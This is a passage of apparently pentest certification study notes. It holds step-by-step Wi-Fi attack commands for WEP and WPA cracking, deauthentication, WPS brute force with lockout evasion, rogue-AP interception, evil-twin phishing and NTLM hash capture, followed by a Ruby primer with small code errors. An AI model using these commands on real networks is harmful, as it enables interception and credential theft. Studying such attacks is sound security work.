Probe Requests searching For pre-configured networks.   This is the command used:  airodump-ng -w &lt;outfile&gt; &lt;interface&gt;   Advice     As Probe Requests will be sent out on all channels, a good tip is to fix the channel in airodump using the -c option.   For example, you could fix your capture on the first channel.   airbase-ng -c &lt;channel&gt; -W 1 -L -e &lt;SSID&gt; &lt;interface&gt;  // airbase is a tool that transform your wireless adapter into a Wi-Fi access point For a series of purposes. // -L = enable the Caffe-Latte attack // -e = sets airbase to act as an AP For the specified SSID. // -c = fixed the wireless channel // -W 1 = force airbase to not set the WEP Privacy Bit in beacons. // When launched it will associate the victim to our fake AP and airbase will automatically start the Caffe-Latte attack // in the airodump window, the data packets rate should start to increase as you collect the IVs      Now we wait to gather a sufficient amount of encrypted packets.       In the mean time, we can start aircrack and feed it with the capture file from airodump.  After 15.000 IVs, we got the Key!       There is a variation of this attack Hirte Attack (using -H switch).      Uses the same tatics plus fragmentation to achieve an higher speed as the same ARP request can be split into multiple shorter encrypted frames.    WPA and WPA2   The Four-Way Handshake     When a new client wants to join a WPA/WPA2 protected network, it must first authenticate itself, proving it owns the shared key.   Step by Step      The shared passphrase is used to generate the PMK (Pairwire Master Key). This key is 256 bits long. Both the STA and AP independently calculate this value combining the PSK and SSID name.     STA &gt; calculates PMK AP   &gt; calculates PMK           The AP sends the STA a message containing a nonce, a secure cryptographic random number. In the WPA specification, this number is called ANonce (as Authenticator Nonce)     AP &gt; sends ANonce &gt; STA           STA generates another nonce, called SNonce (Supplicant Nonce), and builds the PTK concatenating the PMK, both nonces, the MAC addresses of AP and STA and processing this product through a cyptographic hash function called PBKDF2-SHA1     STA builds the PTK           STA then sends its SNonce to the AP that can now build the PTK. As it uses the same information, both PTKs will be the same without the original PSK ever being transmitted over the air. This third message also contains a MIC (Message Integrity Code) which is used to authenticate the sending STA.     SNonce + MIC &gt; AP builds the PTK           The AP replies back with a message containing the GTK (Group Temporal Key) used to decrypt multicast and broadcast traffic. This message is also authenticated by means of MIC. An acknowledgment concludes the process.     AP &gt; replies GTK + MIC STA &gt; sends ack to conclude the process &gt; AP           Capture the Handshake  Launch airodump and start sniffing on the correct channel:  airodump-ng -w &lt;outfile&gt; -c &lt;channel&gt; &lt;interface&gt;      ps: If we wanted to perform a totally passive attack, we could have waited For a new client to join the network but this could require a lot of time.    Write down the client MAC address and launch the deauth attack against it:  aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;client_mac&gt; &lt;interface&gt;      If the victim STA is inside the reachable area of your wireless card, it will be forced to rejoin the network and you should be able to get a new 4-way handshake After getting the handshake its time to crack it.    Using Aircrack against the Handshake     Dictionary attack (also available For WEP)   Pure brute force attack   Launch aircrack-ng:  aircrack-ng -w &lt;wordlist&gt; &lt;.cap file&gt;      the cap file is the captured handshake of the previous step.    Building a Wordlist with Crunch  → http://sourceforge.net/projects/crunch-wordlist/      A tools that can help you extend your basic wordlist with all kinds of transformations (or even build a wordlist from scratch following your criteria) is Crunch   Syntax:  crunch &lt;min_length&gt; &lt;max_length&gt;  // crunch will generate all of the possible combination of words between the two length values. By default, only lowercase letters are used.      Hint: Start with a minimum length of 8 as routers and APs require a passphrase at least that long. Crunch will output the words to the console by default. Let us save them to file.    crunch 8 8 -o my_words.lst   // it will save on the my_words file // Keep in mind that this particular command will generate almost 1.8TB of data and requires some time too. So leave your machine crunching!      Tip: You can manipulate your wordlist using commands: sed, tr, rev, uniq, seq!, etc    crunch 8 8 | aircrack-ng -e LabNetwork file.cap -w -  // -w - = tells aircrack to read words from the standard input. This avoids saving the huge amount of data but it slightly increases the overhead.      Tip: If you want to compare your computing power, you can run:    aircrack-ng -S  // This command will benchmark your WPA key crunching power and output the estimated k/s value.   Exploit the GPU power     The latest video card generations added the ability to use the raw power of the modern GPUs For general purposes.   Many tools were developed to exploit these capabilities For password bruteforcing:  oclHashcat Pyrit John the Ripper   OclHashCat  → http://hashcat.net/oclhashcat/      Make sure your GPU is supported   To be able to discover the handshake key, you need to transform the .cap file to a format understandable by the program.   The tool in fact needs an .hccap (HashCat capture) files.   To convert you can use:   → https://hashcat.net/cap2hccap/      You have to upload the .cap file, specify the network SSID and then download the converted file.   You can also convert using aircrack with the -J option   Launch the cracking:  olcHashCat -m 2500 &lt;.hccap file&gt; &lt;wordlist file&gt;  // -m 2500 = tells the tool to crack a WPA/WPA2 handshake      oclhashcat = its compatible with AMD/ATI GPUs cudahashcat = its compatible with nVidia       We cracked the handshake 5x faster with the GPU option.   Cracking as a Service     If you do not have a powerful GPU or you do not want to stress your hardware calculating hashes is another possibility. The cloud!   online hash crack     WPA cloud cracking service:   → http://www.onlinehashcrack.com/WPA-WPA2-RSNA-PSK-crack.php // These services only require you to upload the .cap file containing the 4-way handshake and specify the target SSID. // The most powerful services need you to pay a small fee. But For under $20, you can greatly increase the success chances of the attack.   CloudCracker     This service uses a 600 millions words dictionary and will give you a response in 20 minutes.   Space-time tradeoff     Alternative bruteforce method, use time-space tradeoff to pre-calculate large amount of hashes and store them in rainbow tables.   it has one important flaw: its slow!   The algorithm used to calculate the PMK, called PBKDF2 requires running 4096 iterations of the HMAC algorithm that is actually designed to be computationlly expensive.   One way to speed up this process is to pre-calculate the PMK For all of the various passphrases in your wordlist.   The calculation of the PMK does not only depend on the used PSK but it also depends on the network SSID value!   How you can create PMK databases? next session   Pyrit  → https://code.google.com/p/pyrit/   Check the database status:  pyrit eval   Import some passwords from our wordlist:  pyrit -i &lt;wordlist_file&gt; import_passwords pyrit eval // now it will detect the imported passwords and remove all the unusable ones.   Now to generate the PMKs, we must provide pyrit with at least one SSID:  pyrit -e &lt;SSID&gt; create_essid   Launch the batch command:  pyrit batch   // At this point, pyrit will start buliding your database For the included SSIDs and password combinations. // Database generation could be a very long process, depending on the power of your CPU.   Launch the attack against the handshake:  pyrit -r &lt;.cap file&gt; attack_db   // pyrit will try all of the different PMKs in its database very quickly and will eventually output the found key if it was initially in your wordlist. // Almost 10 times faster than aircrack   Pre-built hash files     You can find pre-built PMKs databases For the most common SSID names.   Church of WiFi = http://www.renderlab.net/projects/WPA-tables/   172k words x 1000 SSIDs, 7GB 1mi words x 1000  SSIDs, 33GB      If you are lucky you could also find spliced portions of these databases, related to a single SSID, by searching the web with Google or asking in network security forums.   Search:  \"&lt;SSID&gt; rainbow table\" or \"&lt;SSID&gt; PMK database\"   Wireless Protected Setup (WPS)   Setup alternative methods:  Push-Button-Connect Internal-Registrar External-Registrar   WPS PIN number:  1st half of PIN / 2nd half of PIN // its divided into two halves of 4 digits each. THe last digit of the second half is a checksum meaning its always calculated from the other digits   Authentication process:  1. both AP and client initialize encryption keys and internal state 2. client proves possession of 1st half of the PIN 3. client proves possesion of 2nd half of the PIN 4. AP sends network security configuration      At every step, if the client is sending wrong data the AP terminates the process and sends an ACK packet   This behavior, combined with the split PIN allows us to build a quite optimized brute force attack   There are two tools that can help you exploit this vulnerability:  Reaver Bully   Reaver  →  https://code.google.com/p/reaver-wps/      Reaver also comes with a secondary tool called wash that can be used to find vulnerable APs.   Bully  →  https://github.com/aanarchyy/bully      It has some advantages over Reaver such as fewer dependencies and a build process optimized For embedded devices.   Attack  With your monitor interface Up and Running, launch:  wash -i &lt;interface&gt;   // Wash will start hopping though the wireless channels and will list discovered APs that support WPS.     Wash output also offers other useful information. Apart from signal level (RSSI column), you can find the WPS Locked column.   IF the cell value is YES, you will find that the corresponding AP disabled WPS due to internal anti_bruteforce protection mechanisms.   This is a major limitation of the WPS attack   Once you are sure your target AP is vulnerable to the attack, you can launch bully with the following command:  bully -b &lt;BSSID&gt; &lt;interface&gt;  // BSSID is the target APs MAC address // Bully will start trying every possible PIN in a randomized order. // You will probably need a few hours to complete the attack and get the WPA/WPA2 key back   You can disable lockout detection in bully and force it to continue the attack, but this is not recommended.  bully -b &lt;BSSID&gt; -L &lt;interface&gt;      A better option to avoid being locked out is to add a certain delay after every PIN attempt.   By adding a pause between each try, you could bypass the attack detection system and get a smoother bruteforce attack.  bully -b &lt;BSSID&gt; -1 &lt;seconds&gt; -2 &lt;seconds&gt; &lt;interface&gt;   // -1 = the delay of the first phase of the attack (first half of the PIN) // -2 = the delay value of the second phase. // Values of 60 seconds or more are recommended For most APs.   Wi-Fi as Attack Vector   Module Map:   Rogue AP  Wardriving   Rogue AP     Imagine being able to set up a Free WIFI Access Point and to control all of the communications through it. What could you do when a client actually connects?   As you are in control of the packet flow, you could launch all of your favorite attacks you have learned to apply in the wired word such as: MitM, ARP poisoning, traffic sniffing or even browser vulnerabilties.   Tool we are gonna use airbase-ng   Features:   → Implementations of the Caffe-Latte and Hirte attacks  → Act as ad-hoc or infrastructure AP  → Encrypt and decrypt traffic  → Can capture WPA/WPA2 handshakes  → Packet manipulation with external commands  → Filtering by BSSID or client MAC      The object of the attack if getting the users notebook to connect to the fake AP   You will be able to recover a good amount of keystream (generally 140 bytes) which is more than what you need to forge your own ARP requests with packetforge   Recover PRGA with a Rogue AP  Setup:  \tA victim client unassociated from any AP \tOur attacking machine **Fake AP**   Put your wireless adapter into monitor mode:  airmon-ng start &lt;interface&gt;   Launch airodump to dump the incoming keystream to a file For later use:  airodump-ng -c &lt;channel&gt; -w &lt;outfile&gt; &lt;interface&gt;   Launch airbase:  airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -s -W 1 &lt;interface&gt;   // set the SSID to be the one you are spoofing // -s = will force the client to authenticate using the SKA method  // -W 1 = set the WEP bit in the beacons as some clients can get confused otherwise      We should get a keystream and a victim connect to the fake AP   in the airodump tab we can see that a SKA handshake was captured and saved in a .xor file.   Its possible to let airbase itself save all the captured information to a file instead of using an external command.  airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -s -E 1 -F &lt;file&gt; &lt;interface&gt;  // just add the -F option   // What was achieved with this attack:     The victim client was tricked into connecting to our spoofed AP and as Shared Authentication was set, we were able to recover a good amount of keystream that we could later re-use to launch further attacks against the client or the AP as we learned in previous modules.   Initiate a WPA/WPA2 Handshake  Launch airbase:  airbase-ng -c &lt;channel&gt; -e &lt;SSID&gt; -W 1 -Z 4 &lt;interface&gt;  // -Z = used to specify WPA2 options while 4 stands For CCMP encryption scheme.      As before, the victim client is tricked into connection to the spoofed AP and we are able to connect the WPA2 handshake    // in the airodump tab we can see that the handshake took place // We were able to get a real handshake without knowing the network PSK      As you recall in the first message of the 4-way handshake, the AP sends an ANonce to the authenticating client which in turn sends its SNonce plus the MIC. Now the AP has all of the needed information to actually try to crack the PSK; the subsequent steps in the handshake are not even needed.   Rogue AP: an Alternative definition   Alternative to Rogue AP:     its an unmanaged and unauthorized wireless AP attached to an enterprise wireless network.   Rogues APs represent a major security threat as they create a wireless backdoor on the internal wired network that bypasses all of the perimeter defenses like firewalls and IDS.   A typical example of Rogue AP is the one set up by an exployee willing to share the company Internet connection with mobile devices or the same employee could bring an AP to connect to from its laptop and bypass internal security policies just to be able to surf social network websites.   In the simplest case, the attacker can passively scan the wireless medium to collect information about network configuration hostnames and IPs.   Sensitive information could also be disclosed such as usernames, passwords or emails (especially if the wireless network uses no encryption)   Main in the Middle attack     setup   → A victim client unassociated from any AP   → The attacker machine should be connected to the internet through a wired interface      Steps of the attack:   → Set up a fake AP   → Start a DHCP server to provide the network configuration to connecting clients   → Forward all the traffic toward the Internet but..   → Act as MitM eavesdropping all the communications   Wireless interface into monitor mode:  airmon-ng start &lt;interface&gt;   Start airbase and set up an AP which a catchy SSID name like Free Internet  airbase-ng -c &lt;channel&gt; -e \"Free Internet\" &lt;interface&gt;   Create a network bridge interface:  brctl addbr br0 brctl addif br0 eth0 brctl addif br0 at0   // br0 = name of the bridge interface // eth0 = your wired interface // at0 = the virtual interface created by airbase      Troubleshooting: brctl - command not found    apt-get install bridge-utils   Assign an IP address to the bridge interface:  ifconfig br0 &lt;ip_address&gt; up      the IP depends on your network config    Enable IP packet forwarding:  echo 1 &gt; /proc/sys/net/ipv4/ip_forward           Try to connect from your victim client through the new Free Internet AP.       // At this point, all of the internet directed traffic from the victim client is already being forwarded through the attack machine.       Try to browser a website from your victim client.   Also confirm your attack machine can connect to the internet   Now we can fire up your favorite sniffing tool and start listening on your virtual wireless interface:  tcpdump -nvi &lt;interface&gt; tcp port 80 -A  // now you can test, log in some account with the victim browser   You could:   → redirect DNS requests  → Change web page content  → harvest user information  → inject browser-specific payloads to exploit browser vulnerabilities  → and so on.   Rogue AP: Evil Twin Attack  → https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)     Similar to Rogue AP, with Evil Twin we combine with a bit of social engineering to obtain a WPA2 networks Pre-shared key without the need to conduct a cryptographic attack against the WPA2 protocol itself.   Setup:  1. Replicate a known AP ESSID via creation of an AP with hostapd 2. De-authenticate a station that is associated to the **real** AP 3. Station reconnects to **Evil Twin** AP 4. The user, upon launching a browser is presented with a web page over HTTP requesting SSID For an **important Firmware Upgrade** 5. We receive the SSID in plain-text via the hTTP page      A tool we can use to conduct this type of attack is Mana        https://github.com/sensepost/mana       Mana allows us to quickly spin up a rogue access point, configure the necessary DHCP settings, and with some modifications to the default configuration, we can host our own web page to be served to a connected station.      To the attack be successful, the attacker AP should be in close proximity to a station already connected to the legitimate AP.       This way, upon de-authentication of the client, the client should auto-reconnect to the AP with the stronger signal (the attacker-controlled AP)   // moreover in the videos      We need 2 wireless adapters   Active monitor mode in the first one:  airmon-ng start wlan0   Monitor the new monitor interface:  airodump-ng wlan0mon --essid &lt;target SSID&gt; --manufacturer   Stop the mon interface and up the wlan0, so we can use later:  airmon-ng stop wlan0mon ifconfig wlan0 up   Install mana toolkit:  apt install mana-toolkit cd /usr/share/mana-toolkit/ cd /run-mana analyse the start-noupstream.sh code   Go to /usr/share/mana-toolkit/hostapd-mana.conf:   → change ssid = Free-Internet or whatever  → change channel = to the same as the target   Go back to the start-noupstream.sh code:   → change the line: dnsmasq -C ... -i $phy // must add the -i  → comment the line below: # dnsspoof ...  → comment the line 30: # msfconsole ...      in another tab   Open metasploit:  msfconsole use auxiliary/server/fakedns options set targetaction FAKE set targetdomain * set targethost 10.0.0.1 exploit -j      copy the html phishing page to /use/share/mana-toolkit/www/portal   Start the payload start-noupstream.sh  ./start-noupstream.sh   Start the second interface to monitor mode:  airmon-ng start wlan1 airodump-ng wlan1mon --essid &lt;name of SSID&gt; --channel 6 (of the target)   Now we need to deauth the target from the legit network to log in ours malicious one:  aireplay-ng --deauth 25 wlan1mon -b &lt;BSSID&gt; -c &lt;SSID&gt; -e &lt;name of network&gt;    // bssid = mac of the target AP    // ssid = mac of the target station    // -e = name of the network      now that the victim enter in our malicious network   when they open the browser, it will automatically open the phishing page   that we can get their password of their WiFi   After they insert the password we can grab from  tail -f /var/log/apache2/access.log      now we can access their WiFi and continue the pentest   with Responder + MANA  Execute the payload:  ./start-noupstream.sh      in another tab   Put the second interface in monitor mode:  airmon-ng start wlan1 airodump-ng wlan1mon -essid &lt;name of network&gt; --channel &lt;same of the target&gt;   Metasploit fake dns:  use auxiliary/server/fakedns set targetaction FAKE set targetdomain * set targethost 10.0.0.1 exploit -j   Create a simple html page:   &lt;html&gt; &lt;img src=\"file://///10.0.0.1/share\" width=\"0\" height=\"0\"&gt;&lt;/img&gt; &lt;img src=\"\\\\10.0.0.1\\share\" width=\"0\" height=\"0\"&gt;&lt;/img&gt; &lt;/html&gt;       copy the page to /usr/share/mana-toolkit/www/portal/   Start responder and verify if its listening in our first interface wlan0:  cd /usr/share/responder python Responder.py -I wlan0    // we can ignore the dns error, because we are using the port 53 in the metasploit fake dns   Deauthenticate:  aireplay-ng --deauth 25 wlan1mon -b &lt;bssid&gt; -c &lt;ssid&gt; -e &lt;network name&gt;      thats it      For learning purposes, we can go to the target pc and start the browser    // it will automatically send the NTLM/NTLMv2 hashes to the responder tab   Attacks against WPA2-Enterprise      WPA2-Enterprise introduced several improvements to the WPA2-PSK model in regards of security.   In the traditional WPA2-PSK model, we have a client (supplicant) that connects to an AP (authenticator), the usual two-party scenario   With WPA2-Enterprise, we introduce a third-party Authentication Server, which is usually a system that supports the RADIUS and Extensible Authentication (EAP) protocols.   Eaphammer     There are several tools that can aid with attacks against WPA2-Enterprise networks   Eaphammer - https://github.com/s0lst1c3/eaphammer   Aside from being able to automate EvilTwin attacks similar to the previously mentioned Mana toolkit   Eaphammer allows us to steal RADIUS credentials, conduct hostile portal attacks to steal Active Directory credentials (through Response-Type attacks), and includes a host of other features we will find useful during wireless pentest engagements:    → built-in Responder integration  → Support For Open networks and WPA-EAP/WPA2-EAP  → No manual configuration necessary For most attacks  → No manual configuration necessary For instalattion and setup process  → Leverages latest version of hostapd (2.6)  → Support For Evil Twin and Karma Attacks  → Generate timed Powershell payloads For indirect wireless pivots  → Integrated HTTP server For Hostile Portal attacks  → Support For SSID cloaking   Wardriving      Is the act of searching For Wi-Fi networks by a person on a moving vehicle using a portable computer, a smartphone or any other wi-fi enabled device.   The main objective of wardriving is creating a map of Wi-Fi Access Points in a specific area   The map can then be used to observe AP distribution and characteristics like SSID names or encryption type   To start wardriving u need:  - A good GPS receiver - A Wi-Fi enabled device - A vehicle      A good free app that you can use For both android and IOS   → https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&amp;hl=en   → WiGLE.net = https://wigle.net/      The website that collects all the user uploaded information and build constantly updated maps of Wi-Fi access points around the world.       After the drive, we used an app functionality which allows one to export the database of founds APs in KML: a format used by Google Earth    // a red pin stands For a strongly encrypted network (WPA/WPA2)   // a yellow one represents a WEP network   // a green stands For a open AP   ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","wifi"],
        "url": "/notes/ecppt/wifi/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser7.jpg"
      },{
        "title": "7 - Metasploit & Ruby",
        "excerpt":"  Ruby Essentials   Installation   Data Types  Control Structures  Methods, Variables and Scope  Classes, Modules and Exceptions   Installation and First Look   http://www.ruby-lang.org/      it comes pre-installed on MAC and many Linux distros like Kali.   in windows you can install: http://rubyinstaller.org/   Verify version:  ruby -v   Update:  apt install ruby_version   Online ruby interpreter:   → http://tryruby.org/      Ruby From other language:   → https://www.ruby-lang.org/en/documentation/ruby-from-other-languages/   Getting Started  ruby -e \"puts 'Hello World\" # Output: Hello World   // -e = echo (it shows the command directly) // puts = print   You can run interactive Ruby programs using the irb tool:  irb --simple-prompt   Suggestions     If you plan to use Ruby scripts intensively, we suggest you use the bash exection shortcut (called shebang) if you are using Linux based system or associate the Ruby files on Windows.   Path of your Ruby interpreter:  which ruby      therefore our script must begin with the shebang     #!/usr/bin/ruby   The power of Ruby  Read files like cat:  ruby -pe 0 'file'  // -pe 0 ‘file’ = read file line to line printing them to stdout and For each line it executes the 0 command   Count the number of the lines of a file:  ruby -ne 'END {print \"Lines:\",$.,\"\\n\"}' file  # -n = puts the code into a loop # -e = execute one line of ruby code # print = prints the following string to stdout without a new line at the end # END = executes the next block of instructions # $. = global variable that holds the last line number read by ruby interpreter # . = used to concatenate strings   Replace lowercase with uppercase, and create a backup of the original:  ruby -i.bak -pe 'gsub \"foo\",\"FOO\"' file_name  # -i = specifies in-place edit mode (edit each line read by -p instead of write it to stdout). If an extension is provided (.bak), ruby makes a backup of the original # gsub = stands For global substitution (replace the first argument with the second)      We suggest you see the Ruby man page or the Help    Libraries     There are different sources of libraries   → the most famous: http://rubygems.org/      Its a Ruby packaging system designed to facilitate the creation, sharing and installation of libraries.   Other sources: RubyForge, GitHub, Ruby Toolbox   RubyGems     gem help   Search For gems:  gem search &lt;string&gt; gem search -r http // -r = remote   Install the gem you want:  gem install &lt;gem name&gt; gem install openssl-extensions gem install -h   List installed gems:  gem list   A very useful gem is pry  gem install pry // it provides an interactive environment with many interesting features such as syntax highlighting pry --simple-prompt   Data Types     everything is an object   Numbers   4.odd? # Output: false 4.even? # Output: true 10.next # Output: 11 10.pred # Output: 9 25.to_s # Output: \"25\" 65.chr # Output: \"A\" 15.integer? # Output: true       In general, if a method ends with the question mark, it means that the returning value is a boolean.    Float   10/3.0 # Output: 3.3333 2.0.integer? # Output: false 2.49.round # Output: 2 2.51.round # Output: 3 2.51.ceil # Output: 3 2.51.floor # Output: 2    Anticipation     pygmentize ip_upto.rb   ruby ip_upto.rb 192.168.1 10 20   //will print 192.168.10~20   Comments   # Comments ...  !=begin   comments in between =end   Strings     use both single and double quotes   Single quote support two escape sequences:  \\' and \\\\   Double quotes support a lot:  \\\" = double quote \\r = carriage return \\s = space \\\\ = single backslash \\n = newline \\t = tab      Also note that instead of using double or single quotes, you can use % (percent character)   You can also use % with brackets, parenthesis, braces or &lt;&gt; signs.      Using alternative Ruby quotes (% characters and custom delimiters) you can write strings containing double or single quotes without escaping them.   - With %q and %Q you can start respectively strings that works as delimited single ( ' ' ) and double quoted ( \" \" ) strings. - both %q and %Q need a custom delimiter too and you can also use the special delimiters:  {},[],(),&lt;&gt;  print %q!Like single quote, \\n is not interpreted as new line! print %Q!Like double quote, \\n is interpreted as new line!   Info about strings     You can define local variable with a lower case letter or an underscore character ( _ ) as first variable character.   some examples:   st = \"A string\"  st.empty? # Output: false st.clear # Output: \"\" st.empty? # Output: true st = \"Another string\" st.length # Output: 14 st.size # Output: 14 st.start_with? \"An\" # Output: true st.end_with? \"ing\" # Output: true st.start_with \"an\" # Output: false st.end_with? \"String\" # Output: false   // remember that a string is an object. You can use all the public methods provided by String and its acestor classes. // by using pry you can display them using the autocomplete feature (pressing the tab key)   Here document notation     Heredoc provides a mechanism For creating free format strings - preserving special characters such as new lines and tabs. This is very useful if you need to use multi-line strings.   Example:  st = &lt;&lt;DELIMITER   ... our    string,,, DELIMITER  print st  # will print the multi-line string    string Arithmetic  Different ways to concatenate:  # (+) Notation str1 = \"Hello\" str2 = \"World\" result = str1 + \" \" + str2  # String Juxtaposition str1 = \"Hello\" str2 = \"World\" result = str1 &lt;&lt; \" \" &lt;&lt; str2  # (&lt;&lt;) Notation str1 = \"Hello\" str2 = \"World\" str1 &lt;&lt; \" \" &lt;&lt; str2  # OO Notation with concat Method str1 = \"Hello\" str2 = \"World\" str1.concat(\" \", str2)    You can repeate strings easily and also freeze them, so they cannot be altered:   # Using * for repetition \"string\" * 2 # =&gt; \"stringstring\"  # Using &lt;&lt; for concatenation st = \"A Ruby\" st &lt;&lt; \" String\" # =&gt; \"A Ruby String\"  # Freezing a string st.freeze # =&gt; \"A Ruby String\" # The string is now frozen and cannot be modified anymore  # Attempting to modify a frozen string will result in an error st &lt;&lt; \"!!!\" # =&gt; FrozenError (can't modify frozen String)       Freeze operates on an object, not on a variable that holds the pointer to the object. Therefore its legal to assign a new object to a variable that refers a frozen object. Indeed you are working with a new object.   You can test if the string is frozen with frozen? method.   String substitution     [index] method can easily change sections of strings.    st = \"We are using Perl\" st[\"Pearl\"] = \"Ruby!!!\" st # Output: We are using Ruby!!!       Another way is sub and gsub   The first replaces the first occurrence, while the latter replaces all the occurrences.  st.sub(\"Perl\",\"Ruby\")      sub and gsub just return a copy of the string with the proper substitution. If you want to modify the original string, you have to use sub! or gsub!   you cant use sub!/gsub! on a frozen object.   You can insert some text into a specific position of a string:  st = \"bcde\" st.insert(0,\"a\") # Output: abcde      -3, it works like python. It counts from the end.    Interpolation     Allows to write Ruby code into a string. This means you can put any code you want to run enclosed in   ruby#{}   And result of the code will appear in the string:  \"string #{Ruby code} string\" example:  #{2*4} apples on the tree  # Output: \"8 apples on the tree\"  name =\"john\" # Output: \"My name is #{name}\"  # just like python fstring  Some useful methods     Sometimes you may have to do some simple operations with text or string   upcase, capitalize, reverse, and so on   Array     A Ruby array is an object that contains other objects which can be accessed using integer indexes. An array can include all type of objects, including other arrays (this is called multidimensional array).   my_array = Array.new(2) my_array[0] = 5 my_array[0] = 9 my_array # Output: [5,9] my_array&lt;&lt;7  my_array # Output: [5,9,7]   // it can be accessed through indexes // it can have multi layers of arrays // by changing a variable inside the array, it also changes the array/variable and vice versa   Insertions     it can be done via ‘«’ operator // like bash   also with ranges [..]   Deletion  a.delete(4)  # through element  a.delete_at(2)  # through index position   concatenation     You can concatenate arrays with + operator or an OO style with .concat method.   Operations between arrays  You can treat an array as a set and perform operations like:  # Union ( | ): concatenates two arrays (removing duplicates) # Intersection ( &amp; ): Only elements that are common to both arrays are returned (removing duplicates) # Difference ( - ): returns the first array without the elements contained into the second array  # Example:  arr1 = [1, 2, 3] arr2 = [3, 4, 5]  # Union (|) union_result = arr1 | arr2 puts \"Union: #{union_result}\"  # Intersection (&amp;) intersection_result = arr1 &amp; arr2 puts \"Intersection: #{intersection_result}\"  # Difference (-) difference_result = arr1 - arr2 puts \"Difference: #{difference_result}\"  # Output: # Union: [1, 2, 3, 4, 5] # Intersection: [3] # Difference: [1, 2]    stack     Ruby arrays provide push and pop methods   Some useful methods  Moreover the array class provides a lot of interesting and useful methods such as:  sort reverse uniq max min      Note that some methods come both with and without the exclamation point ( ! )   so when its done, also affects the original variable/object   Arrays and Strings     You can easily create a String starting from an Array (and vice versa) using the join method.   and to create an array starting from a String using the split method // just like python   → moreover: http://www.ruby-doc.org/core-1.9.3/Array.html   References  →  http://www.ruby-doc.org/core-1.9.3/   Ranges and Hash      Ruby Ranges allows data to be represented in the form of a range. You can create different ranges of values: numbers, characters, strings or objects in general   A range is made of a start value, an and value and a range of values in between.   Two ways to create ranges:  the inclusive (a..b)  # 2 dots - it includes all values the exclusive (a...b)  # 3 dots - it excludes the last value (in this case 'b')   Example:  (2..4).to_a // to_a = means to array # Output: [2,3,4]  (2...4).to_a # Output: [2,3]  # the same with letters # differents data types supports differents methods  example float: (1.0..3.0).step.to_a //without step it bugs # Output: [1.0, 2.0, 3.0]   Another methods:  min max begin end etc   You can check if a value belongs to the range using the include method or the === operator  (2..10).include?(4) # Output: true  (2..10) === (14) # Output: false      Ranges can be expressed using variables too    a = 5 b = 10 a..b  # Output: 5..10  (a..b).to_a  # Output: [5,6,7,8,9]   Hashes     similar to arrays. The main difference is that hashes are like dictionaries, so instead of using integer indexes   You can use an object index as key:  character string regex symbols and so on      Obviously the value of an hash element can be of any type   to define a hash you must use {} instead of []        The inline syntax allows you to create an hash very quickly using the operator =&gt;. The value on the left of the operator is the object index while what follows is its values.       To avoid quotes in hash keys, Ruby allows symbols based key values:   → http://ruby-doc.org/core-1.9.3/Symbol.html           Symbols are a particular feature in Ruby. Generally they are a data type, but Ruby handles them in a special way.            A simple way to use them is by adding a colon (:) before the key name (that becomes a symbol).       Note that there are no quotes:  hash = {:name =&gt; 'Bob', :age =&gt; 25, :gender =&gt; 'M'} hash[:name] # Output: \"Bob\"  Can be used a rapid notation (KEY:VALUE)  → hash = {name: 'Bob', age:25, gender:'M'} # but does not work For integer key value   → moreover: http://www.ruby-doc.org/core-1.9.3/Hash.html   Basic Control Structures  →  http://ruby-doc.org/docs/keywords/1.9/Object.html   Comparison Operator                  operator       description                 ==       Equality operator                 .eql?       Equality operator (OO style)                 !=       Inequality operator                 &lt;       less than                 &gt;       greater than                 &lt;=       less than or equal to                 &gt;=       greater than or equal to                          a &lt;=&gt; b                 0 - if a == b                 1 - if a &gt; b                 -1 - if a &lt; b           Conditionals  if x &gt; 5 then   puts \"\\ngreater than 5\\n\\n\" end if x &lt; 20   puts \"less than 20\\n\\n\" end  # we can use else also # and elsif // like python   x = 10 puts \"x is integer \\n\" if x.is_a? Integer # Output: x is integer      Everything is an expression. Expressions like print or puts have a return value too (nil in this case is)   Unless     THe unless steatment is the opposite of if. It executes the associated code only if the conditional expressoin return false or nil.   Case     The case statements is a valid substitute For if/elsif   It tests in order each when clause until it finds a condition that returns true; otherwise the final else is executed.   x=1 case x when 1 then print \"one\" else print \"I dont know\" end  x=1 name = case x when 1 then print \"maria\" else print \"I dont know\" end  x=1 name = case when x == 1 then print \"luna\" else print \"I dont know\" end      The equality operator === is useful to work in Ranges.   With Classes and Instances too:  String == \"Hello\" # Output: false String === \"Hello\" # Output: true   Ternary Operator  &gt;&gt; test_expr? true_expr : false_expr &gt;&gt; name == \"Bob\" ? \"Hi Bob\" : \"Who are you?\"   Loops  While:  while &lt;expression&gt;   &lt;..block&gt;  end      the keyword do is required with inline basic while statement instead    print i+=1, \"\\s\" while i &lt; 5  print array.pop,\"\\s\" while !array.empty?   Until:  until &lt;expression&gt;   &lt;block&gt; end      the keyword do is required with inline basic while statement instead    For:  for &lt;var&gt; in &lt;collection&gt;   &lt;block&gt; end  for x in [10,20,5] do   print i*2.\"\\s\" end  - with range for i in 1..10   print i*2,\"\\s\" end   Iterators  Its a method that allows you to loop through the members of a colletion:  (1..5).each { |i| print i*2,\"\\s\"} # Output: 2 4 6 8 10  (1..5).each  do |c|   print i*2,\"\\s\" # Output: 2 4 6 8 10   Enumerable Objects     other common enumerable objects are Arrays, Hashes and Ranges.   stataments like collect/map, select, reject, inject are iterators too   each of them can be used either to modify the original collection (just append the exclamation mark ! at the end of the method) or to create a new collection starting from the original.   collect/map statements are synonymous:  array = [1,2,3] array.map {|x| x**2} # Output: [1,4,9]   select returns an array of the original collection elements For which the associated block returns a positive value (no false, no nil)   - array.select { |x| x&gt;2} # Output: 3,4,5           reject is the opposite of select. it returns an array of original collection elements For which the associated block returns a false or nil.            inject - The block associated to inject has two arguments. the first is an accumulator from previous iteration while the second is the next element of the enumerable object.       array = [ 2,3,4,5,6,7] array.inject {|mul,x| mul * x}  # Output: 5040      the mul its the accumulator, so its gonna save each of the results and keeping multiplying until the list is over   The value of the accumulator is the initial value of the list, but can be specified with round brackets ( )   array = [ 1,2,3,4,5] array.inject(100) {|sum,x| sum + x}  # Output: 115   Enumerator     its an object whose purpose is to enumerate another enumerable object. This means that enumerators are enumerable too.   when we used each, map, select, etc., we implicitly used enumerators too.   usage: example, if you have a method that uses an enumerable object, you may not want to pass the enumerable collection object because its mutable and the method may modify it.   So you can pass an enumerator created with 